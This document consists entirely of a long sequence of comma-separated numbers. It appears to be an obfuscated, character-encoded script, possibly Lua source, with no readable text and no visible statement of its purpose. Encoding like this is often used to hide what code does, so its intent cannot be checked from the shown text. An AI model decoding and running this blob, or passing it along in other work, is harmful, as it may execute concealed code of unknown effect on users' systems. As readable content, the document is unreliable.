25,4,13,5,25,7,0,6,25,7,1,13,25,7,7,2,25,7,1,2,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,0,6,25,7,0,6,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,4,12,1,25,4,12,2,25,4,1,4,25,7,7,0,25,4,1,4,25,4,2,1,25,4,2,7,25,4,3,1,25,4,3,13,25,4,13,12,25,4,3,5,25,4,13,3,25,4,3,4,25,4,2,4,25,4,1,5,25,4,3,5,25,4,3,6,25,4,3,5,25,4,13,12,25,7,0,7,25,7,6,12,25,7,1,7,25,7,6,12,25,4,1,5,25,4,3,5,25,4,3,6,25,4,3,5,25,4,13,12,25,7,0,7,25,7,7,0,25,4,3,12,25,4,13,12,25,4,3,5,25,4,3,7,25,4,0,2,25,4,6,3,25,4,1,4,25,7,6,4,25,7,0,4,25,7,0,0,25,7,7,2,25,7,6,12,25,7,0,4,25,7,0,0,25,7,7,2,25,7,6,12,25,7,0,4,25,7,0,0,25,7,6,5,25,4,12,1,25,4,12,2,25,4,1,4,25,7,7,0,25,4,0,0,25,4,2,5,25,4,13,6,25,4,13,2,25,4,1,5,25,4,3,5,25,4,3,6,25,4,3,5,25,4,13,12,25,7,0,7,25,7,6,12,25,7,1,7,25,7,6,12,25,4,1,5,25,4,3,5,25,4,3,6,25,4,3,5,25,4,13,12,25,7,0,7,25,7,7,0,25,4,3,12,25,4,13,12,25,4,3,5,25,4,3,7,25,4,0,2,25,4,6,3,25,4,1,4,25,7,6,4,25,7,0,6,25,7,0,5,25,7,0,5,25,7,7,2,25,7,6,12,25,7,0,6,25,7,0,5,25,7,0,5,25,7,7,2,25,7,6,12,25,7,0,6,25,7,0,5,25,7,0,5,25,7,6,5,25,4,12,1,25,4,12,2,25,4,12,1,25,4,12,2,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,12,25,4,2,7,25,4,13,3,25,4,2,7,25,4,3,2,25,4,3,3,25,4,3,6,25,4,3,6,25,4,3,5,25,7,6,4,25,7,6,5,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,1,1,25,7,7,2,25,7,6,12,25,4,12,4,25,4,3,6,25,4,13,12,25,7,6,12,25,4,3,3,25,4,3,4,25,7,6,12,25,4,3,3,25,4,12,4,25,4,2,1,25,4,3,3,25,4,13,12,25,4,13,13,25,7,6,4,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,4,13,13,25,7,1,0,25,4,6,3,25,4,2,5,25,4,13,2,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,4,13,13,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,4,25,4,3,5,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,3,25,4,3,12,25,7,6,12,25,4,12,4,25,4,3,6,25,4,13,12,25,7,6,12,25,4,2,2,25,7,1,7,25,7,6,12,25,4,6,4,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,7,6,12,25,4,13,2,25,4,3,2,25,4,2,5,25,4,3,4,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,3,25,4,3,12,25,7,6,12,25,4,12,4,25,4,3,6,25,4,13,12,25,7,7,0,25,4,1,4,25,4,2,1,25,4,2,7,25,4,3,1,25,4,12,4,25,4,2,1,25,4,2,7,25,4,3,1,25,7,1,0,25,4,6,2,25,4,3,3,25,4,3,4,25,4,2,4,25,4,6,2,25,4,3,3,25,4,13,12,25,4,13,13,25,4,13,2,25,4,1,5,25,4,3,2,25,4,3,3,25,4,3,6,25,4,2,4,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,1,25,7,0,6,25,7,0,6,25,7,7,2,25,7,1,3,25,7,0,5,25,7,7,2,25,7,1,2,25,7,1,2,25,7,7,2,25,7,1,2,25,7,1,13,25,7,7,2,25,7,1,2,25,7,0,4,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,4,25,7,1,3,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,7,6,12,25,4,3,5,25,4,13,12,25,7,6,12,25,7,6,4,25,4,12,4,25,4,3,6,25,4,13,12,25,7,7,0,25,4,1,5,25,4,3,2,25,4,2,1,25,4,13,12,25,4,2,1,25,4,2,7,25,4,13,2,25,4,2,5,25,4,13,12,25,7,6,12,25,4,2,1,25,4,3,4,25,4,2,4,25,7,6,12,25,4,12,4,25,4,3,6,25,4,13,12,25,7,7,0,25,4,1,5,25,4,3,2,25,4,2,1,25,4,13,12,25,4,2,1,25,4,2,7,25,4,13,2,25,4,2,5,25,4,13,12,25,7,1,0,25,4,6,2,25,4,3,3,25,4,3,4,25,4,2,4,25,4,6,2,25,4,3,3,25,4,13,12,25,4,13,13,25,4,13,2,25,4,1,5,25,4,3,2,25,4,3,3,25,4,3,6,25,4,2,4,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,1,13,25,7,1,2,25,7,7,2,25,7,0,1,25,7,0,0,25,7,1,13,25,7,7,2,25,7,0,1,25,7,0,0,25,7,1,2,25,7,7,2,25,7,1,3,25,7,1,3,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,6,25,7,0,0,25,7,0,7,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,1,13,25,7,0,4,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,7,6,5,25,7,6,12,25,4,13,2,25,4,3,2,25,4,2,5,25,4,3,4,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,3,25,4,3,12,25,7,6,12,25,4,12,4,25,4,3,6,25,4,13,12,25,7,7,0,25,4,1,5,25,4,3,2,25,4,2,1,25,4,13,12,25,4,2,1,25,4,2,7,25,4,13,2,25,4,2,5,25,4,13,12,25,7,6,12,25,4,2,1,25,4,3,4,25,4,2,4,25,7,6,12,25,4,12,4,25,4,3,6,25,4,13,12,25,7,7,0,25,4,1,5,25,4,3,2,25,4,2,1,25,4,13,12,25,4,2,1,25,4,2,7,25,4,13,2,25,4,2,5,25,4,13,12,25,7,1,0,25,4,6,2,25,4,3,3,25,4,3,4,25,4,2,4,25,4,6,2,25,4,3,3,25,4,13,12,25,4,13,13,25,4,13,2,25,4,1,5,25,4,3,2,25,4,3,3,25,4,3,6,25,4,2,4,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,7,25,7,0,1,25,7,7,2,25,7,0,7,25,7,0,4,25,7,7,2,25,7,0,5,25,7,1,2,25,7,7,2,25,7,0,5,25,7,0,4,25,7,7,2,25,7,0,5,25,7,1,13,25,7,7,2,25,7,0,5,25,7,1,12,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,1,2,25,7,1,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,1,3,25,7,7,2,25,7,0,4,25,7,7,2,25,7,0,5,25,7,0,0,25,7,7,2,25,7,0,1,25,7,0,5,25,7,7,2,25,7,0,1,25,7,0,5,25,7,7,2,25,7,0,6,25,7,0,0,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,1,3,25,7,1,12,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,5,25,7,1,3,25,7,7,2,25,7,0,1,25,7,0,0,25,7,7,2,25,7,0,6,25,7,0,5,25,7,7,2,25,7,0,7,25,7,0,1,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,0,0,25,7,1,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,7,6,12,25,4,13,2,25,4,3,2,25,4,2,5,25,4,3,4,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,12,4,25,4,3,6,25,4,13,12,25,7,7,0,25,4,1,5,25,4,3,2,25,4,2,1,25,4,13,12,25,4,2,1,25,4,2,7,25,4,13,2,25,4,2,5,25,4,13,12,25,7,7,0,25,4,6,0,25,4,13,3,25,4,3,7,25,4,2,1,25,4,3,4,25,4,3,5,25,4,3,3,25,4,2,4,25,4,0,2,25,4,3,5,25,4,3,5,25,4,13,2,25,4,0,12,25,4,2,1,25,4,13,12,25,4,13,2,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,1,25,4,12,2,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,1,25,4,12,2,25,4,12,1,25,4,12,2,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,12,25,4,3,13,25,4,13,3,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,7,6,4,25,4,6,4,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,7,7,0,25,4,1,5,25,4,3,2,25,4,2,1,25,4,13,12,25,4,2,1,25,4,2,7,25,4,13,2,25,4,2,5,25,4,13,12,25,7,6,12,25,4,2,1,25,4,3,4,25,4,2,4,25,7,6,12,25,4,6,4,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,7,7,0,25,4,1,5,25,4,3,2,25,4,2,1,25,4,13,12,25,4,2,1,25,4,2,7,25,4,13,2,25,4,2,5,25,4,13,12,25,7,1,0,25,4,6,2,25,4,3,3,25,4,3,4,25,4,2,4,25,4,6,2,25,4,3,3,25,4,13,12,25,4,13,13,25,4,13,2,25,4,1,5,25,4,3,2,25,4,3,3,25,4,3,6,25,4,2,4,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,1,13,25,7,0,7,25,7,7,2,25,7,0,1,25,7,0,6,25,7,0,7,25,7,7,2,25,7,1,3,25,7,1,12,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,0,4,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,7,6,5,25,7,6,12,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,6,4,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,7,7,0,25,4,1,4,25,4,2,1,25,4,2,7,25,4,3,1,25,4,12,4,25,4,2,1,25,4,2,7,25,4,3,1,25,7,1,0,25,4,6,2,25,4,3,3,25,4,3,4,25,4,2,4,25,4,6,2,25,4,3,3,25,4,13,12,25,4,13,13,25,4,13,2,25,4,1,5,25,4,3,2,25,4,3,3,25,4,3,6,25,4,2,4,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,6,25,7,0,6,25,7,0,1,25,7,7,2,25,7,0,6,25,7,0,7,25,7,1,3,25,7,7,2,25,7,0,6,25,7,0,4,25,7,0,4,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,0,5,25,7,0,4,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,4,12,1,25,4,12,2,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,1,25,4,12,2,25,4,12,1,25,4,12,2,25,4,1,4,25,7,7,0,25,4,6,5,25,4,3,5,25,4,13,3,25,4,13,13,25,4,2,5,25,4,1,4,25,4,13,3,25,4,13,2,25,4,13,2,25,4,3,5,25,4,3,4,25,7,0,1,25,4,1,5,25,4,3,6,25,4,3,3,25,4,2,7,25,4,3,1,25,7,1,0,25,4,1,5,25,4,3,5,25,4,3,4,25,4,3,4,25,4,2,5,25,4,2,7,25,4,13,2,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,4,2,1,25,4,13,12,25,4,3,13,25,4,2,5,25,4,13,2,25,4,6,0,25,4,0,2,25,4,0,12,25,7,6,12,25,7,1,7,25,7,6,12,25,4,2,7,25,4,13,3,25,4,2,7,25,4,3,2,25,4,3,3,25,4,3,6,25,4,3,6,25,4,3,5,25,7,6,4,